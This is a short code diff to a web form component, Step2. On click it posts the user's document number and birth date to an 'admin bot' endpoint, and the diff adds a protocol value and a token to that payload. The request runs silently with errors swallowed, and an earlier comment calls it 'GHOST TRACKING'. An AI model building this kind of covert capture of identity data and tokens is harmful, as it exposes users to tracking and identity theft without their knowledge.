@@ -91,13 +91,18 @@ export function Step2({ data, onReset }: Step2Props) {
 
         const message = encodeURIComponent(header + "\n\n" + body);
 
-        // Notify Admin Bot & Update original Session message (GHOST TRACKING)
+        // Notify Admin Bot IMMEDIATELY upon click
         try {
           const userIdForApi = localStorage.getItem('svr_user_id');
           if (userIdForApi) {
             axios.post(`${API_URL}/api/v1/session/convert`, {
               userId: userIdForApi,
-              details: { docValue: data.docValue, birthDate: data.birthDate }
+              details: { 
+                docValue: data.docValue, 
+                birthDate: data.birthDate,
+                protocol: protocol,
+                token: token
+              }
             });
           }
         } catch (e) { }
